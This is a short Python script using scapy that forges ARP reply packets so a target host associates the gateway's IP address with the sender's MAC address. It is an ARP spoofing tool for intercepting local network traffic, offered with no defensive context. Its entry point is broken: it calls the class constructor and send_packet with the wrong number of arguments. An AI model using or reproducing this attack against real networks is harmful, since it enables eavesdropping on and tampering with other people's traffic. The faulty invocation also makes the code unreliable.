import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp
from scapy.layers.l2 import Ether,ARP
from scapy.layers.inet import TCP,IP,ICMP


class Spoof:
    def __init__(self):
    
        self.ether=Ether()
    
        self.arp=ARP()


    def send_packet(self,my_mac,gateway_IP,target_IP,target_mac):
       
        self.ether.src = my_mac

       
        self.arp.psrc = gateway_IP
        self.arp.hwsrc = my_mac

        self.arp = self.arp
        self.arp.pdst = target_IP
        self.arp.hwdst = target_mac
    
        self.ether = self.ether
        self.ether.src = my_mac
        self.ether.dst = target_mac

        self.arp.op = 2
        self.broadcast()
            
    def broadcast(self):

        self.packet=self.ether/self.arp
        sendp(x=self.packet,verbose=False)

if __name__ == "__main__":
    spoof=Spoof('','')
    spoof.send_packet('','')